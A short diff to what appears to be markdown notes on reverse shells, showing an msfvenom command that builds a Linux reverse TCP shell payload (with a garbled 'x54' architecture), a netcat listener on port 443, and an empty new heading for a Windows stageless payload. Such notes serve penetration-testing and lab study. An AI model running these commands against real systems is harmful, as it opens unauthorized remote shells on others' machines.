@@ -49,5 +49,14 @@ msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > createback
 
 ### Start listener to wait on target execute
 ```bash
-nc -lnvp 
+sudo nc -lnvp 443
+```
+
+---
+
+## Stageless Payload on Windows
+
+### Create Payload on attacker box
+```bash
+
 ```
